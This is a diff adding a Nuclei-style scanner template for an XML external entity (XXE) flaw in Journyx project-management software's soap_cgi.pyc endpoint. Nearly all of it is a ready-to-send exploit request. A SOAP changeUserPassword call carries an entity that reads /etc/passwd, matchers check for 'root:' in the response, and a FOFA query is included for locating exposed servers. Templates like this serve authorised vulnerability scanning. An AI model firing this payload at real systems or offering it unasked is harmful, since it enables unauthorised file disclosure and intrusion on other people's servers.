@@ -1,0 +1,36 @@
+id: Journyx-soap_cgi-xxe
+
+info:
+  name: Journyx项目管理软件 soap_cgi.pyc XML外部实体注入
+  author: HuanXiong
+  severity: high
+  description: |-
+    fofa: body="Journyx"
+
+  tags: XXE
+
+http:
+  - raw:
+      - |
+        POST /jtcgi/soap_cgi.pyc HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Content-Type: application/xml
+
+        <?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header/><soapenv:Body><changeUserPassword><username>&test;</username><curpwd>zzz</curpwd><newpwd>zzz123</newpwd></changeUserPassword></soapenv:Body></soapenv:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:'
+      - type: status
+        status: 
+          - 200
+
+
+
+
+
+
